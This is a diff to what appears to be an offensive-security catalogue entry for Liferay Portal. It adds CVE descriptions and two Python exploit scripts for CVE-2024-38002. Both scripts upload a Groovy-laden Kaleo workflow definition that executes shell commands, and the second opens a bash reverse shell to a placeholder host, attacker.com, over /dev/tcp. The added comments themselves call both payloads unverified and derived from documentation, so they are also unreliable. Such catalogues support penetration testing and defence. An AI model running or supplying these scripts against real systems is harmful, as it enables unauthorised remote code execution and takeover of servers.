@@ -1,21 +1,24 @@
 ---
-comment: |
-  Liferay Portal is a Java-based enterprise CMS and portal platform.
-
-  CVE-2020-7961 (CVSS 9.8, CISA KEV): Unauthenticated RCE via Java deserialization in the
-  `/api/jsonws` endpoint. Liferay's JSON Web Services API deserializes user-supplied data
-  without validation when invoking the `DDMDataProviderInstance` service. The `invokerURL`
-  parameter is passed to an unmarshaller that performs a JNDI lookup, triggering
-  deserialization of attacker-controlled data via the c3p0
-  `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` gadget chain. A successful exploit
-  executes arbitrary code as the Liferay process user. Affects Liferay Portal 6.1.0 through
-  7.2.1 GA2. Fixed in 7.2.1 CE GA2 and DXP fix packs.
-  nuclei: CVE-2020-7961
-  ExploitDB: 50/50070
-
-  Admin RCE via Groovy script console: Liferay Portal exposes a server-side scripting
-  console at /group/control_panel/manage/-/server/script for server administrators.
-  Arbitrary Groovy code executes inside the JVM as the Liferay process user.
+comment: "Liferay Portal is a Java-based enterprise CMS and portal platform.\n\nCVE-2020-7961\
+  \ (CVSS 9.8, CISA KEV): Unauthenticated RCE via Java deserialization in the\n`/api/jsonws`\
+  \ endpoint. Liferay's JSON Web Services API deserializes user-supplied data\nwithout\
+  \ validation when invoking the `DDMDataProviderInstance` service. The `invokerURL`\n\
+  parameter is passed to an unmarshaller that performs a JNDI lookup, triggering\n\
+  deserialization of attacker-controlled data via the c3p0\n`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`\
+  \ gadget chain. A successful exploit\nexecutes arbitrary code as the Liferay process\
+  \ user. Affects Liferay Portal 6.1.0 through\n7.2.1 GA2. Fixed in 7.2.1 CE GA2 and\
+  \ DXP fix packs.\nnuclei: CVE-2020-7961\nExploitDB: 50/50070\n\nCVE-2024-38002 (CVSS\
+  \ 9.0): Authenticated RCE via the Kaleo Workflow headless REST API.\nThe `/o/headless-admin-workflow/v1.0/workflow-definitions`\
+  \ endpoint fails to verify\nthat the caller has permission to modify workflow definitions.\
+  \ Any authenticated user\n(not just admins) can submit a workflow definition containing\
+  \ an embedded Groovy script,\nwhich the Kaleo engine executes server-side as the\
+  \ Liferay process user.\nAffects Portal 7.3.2\u20137.4.3.111 / DXP 2023.Q4.0\u2013\
+  Q4.5, 2023.Q3.1\u2013Q3.8.\n\nCVE-2025-3639 (High): MFA bypass via GET login. Sending\
+  \ credentials via a GET request\nto /c/portal/login (password in query string) bypasses\
+  \ the MFA challenge entirely.\nAffects Portal 7.3.0\u20137.4.3.132 / DXP 2024.Q1.1\u2013\
+  2025.Q1.6.\n\nAdmin RCE via Groovy script console: Liferay Portal exposes a server-side\
+  \ scripting\nconsole at /group/control_panel/manage/-/server/script for server administrators.\n\
+  Arbitrary Groovy code executes inside the JVM as the Liferay process user.\n"
 docker:
   compose: "services:\n  liferay:\n    image: liferay/portal:7.2.1-ga2\n    ports:\n\
     \      - \"8080:8080\"\n    environment:\n      LIFERAY_SETUP_PERIOD_WIZARD_PERIOD_ENABLED:\
@@ -94,6 +97,98 @@ functions:
       console:
   rce:
   - code: |
+      #!/usr/bin/env python3
+      # CVE-2024-38002: authenticated RCE via Kaleo Workflow Groovy execution
+      # Any authenticated user can create a workflow definition with embedded Groovy.
+      # The Kaleo engine executes the script when the workflow state is entered.
+
+      import requests
+
+      TARGET = "http://victim.com:8080"
+      USER   = "user@liferay.com"
+      PASS   = "userpassword"
+
+      CMD = "id > /tmp/rce_out.txt"
+
+      workflow_xml = f"""<?xml version="1.0"?>
+      <workflow-definition
+          xmlns="urn:liferay.com:liferay-workflow_7.4.0"
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xsi:schemaLocation="urn:liferay.com:liferay-workflow_7.4.0
+              http://www.liferay.com/dtd/liferay-workflow-definition_7_4_0.dtd">
+        <name>exploit</name>
+        <description>exploit</description>
+        <version>1</version>
+        <state>
+          <name>created</name>
+          <initial>true</initial>
+          <actions>
+            <action>
+              <name>trigger</name>
+              <script><![CDATA[
+                def proc = ["/bin/sh", "-c", "{CMD}"].execute()
+                proc.waitFor()
+              ]]></script>
+              <script-language>groovy</script-language>
+              <execution-type>onEntry</execution-type>
+            </action>
+          </actions>
+          <transitions>
+            <transition><name>done</name><target>approved</target></transition>
+          </transitions>
+        </state>
+        <state><name>approved</name><initial>false</initial></state>
+      </workflow-definition>"""
+
+      # Step 1: upload the malicious workflow definition
+      r = requests.post(
+          f"{TARGET}/o/headless-admin-workflow/v1.0/workflow-definitions",
+          auth=(USER, PASS),
+          headers={"Content-Type": "application/xml"},
+          data=workflow_xml,
+          verify=False,
+      )
+      wf_id = r.json().get("id")
+      print(f"Workflow created: {wf_id}")
+
+      # Step 2: assign the workflow to a content type (e.g. Journal Articles)
+      requests.put(
+          f"{TARGET}/o/headless-admin-workflow/v1.0/workflow-definitions/{wf_id}/assign-to-asset-types",
+          auth=(USER, PASS),
+          json=[{"assetType": "com.liferay.journal.model.JournalArticle"}],
+          verify=False,
+      )
+
+      # Step 3: create a Journal Article to trigger a new workflow instance
+      # (or submit any existing asset in the workflow through a transition)
+      requests.post(
+          f"{TARGET}/o/headless-delivery/v1.0/sites/20122/structured-contents",
+          auth=(USER, PASS),
+          json={
+              "title": "exploit",
+              "contentStructureId": 0,
+              "contentFields": [],
+          },
+          verify=False,
+      )
+      # The onEntry Groovy script executes when the workflow instance is created.
+      # Output is written to /tmp/rce_out.txt on the Liferay host.
+    comment: "CVE-2024-38002 (CVSS 9.0): The Kaleo Workflow headless API does not\
+      \ enforce\npermission checks on workflow definition creation/update. Any authenticated\n\
+      user (not just admins) can submit a workflow definition containing a Groovy\n\
+      script, which executes server-side as the Liferay process user when a workflow\n\
+      instance enters the defined state.\nRef: https://liferay.dev/portal/security/known-vulnerabilities/-/asset_publisher/jekt/content/cve-2024-38002\n\
+      \n\u26A0\uFE0F Unverified payload: no public standalone PoC exists. The workflow\
+      \ XML schema,\nsite ID (20122 is the default Liferay guest community but may\
+      \ differ), and trigger\nsequence (structured content creation \u2192 onEntry\
+      \ execution) are derived from Liferay\nAPI documentation and the CVE advisory,\
+      \ not a tested exploit. Verify the site ID\nvia GET /o/headless-delivery/v1.0/sites\
+      \ and confirm the onEntry trigger fires\nbefore relying on this payload.\n"
+    contexts:
+      authenticated:
+    version: |-
+      Portal 7.3.2 - 7.4.3.111 / DXP 2023.Q4.0-Q4.5, 2023.Q3.1-Q3.8
+  - code: |
       # CVE-2020-7961: unauthenticated RCE via JSONWS deserialization
       # Requires: ysoserial (https://github.com/frohoff/ysoserial) and
       #           a JNDI exploit server (e.g., marshalsec or JNDI-Exploit-Kit)
@@ -145,6 +240,44 @@ functions:
       console:
     platform: linux
   reverse-shell:
+  - blind: true
+    code: "#!/usr/bin/env python3\n# CVE-2024-38002: reverse shell via Kaleo Workflow\
+      \ Groovy \u2014 any authenticated user\nimport requests\n\nTARGET = \"http://victim.com:8080\"\
+      \nUSER   = \"user@liferay.com\"\nPASS   = \"userpassword\"\nLHOST  = \"attacker.com\"\
+      \nLPORT  = 12345\n\nworkflow_xml = f\"\"\"<?xml version=\"1.0\"?>\n<workflow-definition\
+      \ xmlns=\"urn:liferay.com:liferay-workflow_7.4.0\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+      \n    xsi:schemaLocation=\"urn:liferay.com:liferay-workflow_7.4.0\n        http://www.liferay.com/dtd/liferay-workflow-definition_7_4_0.dtd\"\
+      >\n  <name>exploit</name><description>exploit</description><version>1</version>\n\
+      \  <state>\n    <name>created</name><initial>true</initial>\n    <actions>\n\
+      \      <action>\n        <name>shell</name>\n        <script><![CDATA[\n   \
+      \       [\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"].execute()\n\
+      \        ]]></script>\n        <script-language>groovy</script-language>\n \
+      \       <execution-type>onEntry</execution-type>\n      </action>\n    </actions>\n\
+      \    <transitions>\n      <transition><name>done</name><target>approved</target></transition>\n\
+      \    </transitions>\n  </state>\n  <state><name>approved</name><initial>false</initial></state>\n\
+      </workflow-definition>\"\"\"\n\nr = requests.post(\n    f\"{TARGET}/o/headless-admin-workflow/v1.0/workflow-definitions\"\
+      ,\n    auth=(USER, PASS), headers={\"Content-Type\": \"application/xml\"},\n\
+      \    data=workflow_xml, verify=False,\n)\nwf_id = r.json().get(\"id\")\nrequests.put(\n\
+      \    f\"{TARGET}/o/headless-admin-workflow/v1.0/workflow-definitions/{wf_id}/assign-to-asset-types\"\
+      ,\n    auth=(USER, PASS),\n    json=[{\"assetType\": \"com.liferay.journal.model.JournalArticle\"\
+      }],\n    verify=False,\n)\nrequests.post(\n    f\"{TARGET}/o/headless-delivery/v1.0/sites/20122/structured-contents\"\
+      ,\n    auth=(USER, PASS),\n    json={\"title\": \"exploit\", \"contentStructureId\"\
+      : 0, \"contentFields\": []},\n    verify=False,\n)\nprint(f\"[*] Payload sent\
+      \ - check listener on {LHOST}:{LPORT}\")\n"
+    comment: "CVE-2024-38002: reverse shell via Groovy embedded in a Kaleo Workflow\
+      \ definition.\nThe shell connects back when the workflow instance enters the\
+      \ `created` state\n(triggered by submitting a Journal Article). The HTTP response\
+      \ returns before\nthe shell connects \u2014 check the listener.\n\n\u26A0\uFE0F\
+      \ Unverified payload: same caveats as the rce entry \u2014 site ID, workflow\
+      \ XML\nschema, and trigger sequence are derived from documentation, not a tested\
+      \ exploit.\n"
+    contexts:
+      authenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |-
+      Portal 7.3.2 - 7.4.3.111 / DXP 2023.Q4.0-Q4.5, 2023.Q3.1-Q3.8
   - blind: true
     code: |
       # CVE-2020-7961: reverse shell via JSONWS deserialization (Linux)
